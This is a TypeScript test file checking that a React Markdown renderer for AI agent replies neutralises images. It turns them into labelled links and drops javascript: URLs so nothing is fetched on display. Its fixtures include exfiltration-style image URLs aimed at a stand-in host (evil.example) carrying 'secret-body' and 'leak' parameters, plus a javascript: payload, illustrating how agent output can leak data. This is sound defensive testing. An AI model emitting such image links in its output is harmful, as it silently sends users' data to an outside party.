import test from "node:test";
import assert from "node:assert/strict";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import AgentMarkdown, { imageLinkLabel } from "../app/components/AgentMarkdown";

const render = (text: string) =>
  renderToStaticMarkup(createElement(AgentMarkdown, { children: text }));

test("an image in an agent reply never renders as <img>, so nothing is fetched on display", () => {
  const html = render("Summary ![logo](https://evil.example/p.png?d=secret-body)");
  assert.ok(!/<img\b/i.test(html), html);
  assert.ok(html.includes('href="https://evil.example/p.png?d=secret-body"'), html);
  assert.ok(html.includes("Image: logo (evil.example)"), html);
  assert.ok(html.includes('rel="noopener noreferrer nofollow"'), html);
});

test("reference-style and alt-less images are neutralised too", () => {
  const html = render("![][x]\n\n[x]: https://evil.example/?leak=1");
  assert.ok(!/<img\b/i.test(html), html);
  assert.ok(html.includes("Image from evil.example"), html);
});

test("raw HTML images in agent output stay inert text", () => {
  const html = render('<img src="https://evil.example/?d=1">');
  assert.ok(!/<img\b/i.test(html), html);
});

test("a javascript: image URL is dropped by the URL transform, not linked", () => {
  const html = render("![x](javascript:alert(1))");
  assert.ok(!html.includes("javascript:"), html);
  assert.ok(!/<img\b/i.test(html), html);
});

test("ordinary Markdown still renders", () => {
  const html = render("**bold** and [a link](https://example.com)");
  assert.ok(html.includes('<strong class="font-semibold">bold</strong>'), html);
  assert.ok(html.includes('href="https://example.com"'), html);
});

test("image link labels degrade when alt text or host is missing", () => {
  assert.equal(imageLinkLabel("chart", "https://a.example/x.png"), "Image: chart (a.example)");
  assert.equal(imageLinkLabel("", "https://a.example/x.png"), "Image from a.example");
  assert.equal(imageLinkLabel("chart", "not a url"), "Image: chart");
  assert.equal(imageLinkLabel(undefined, undefined), "Image");
});
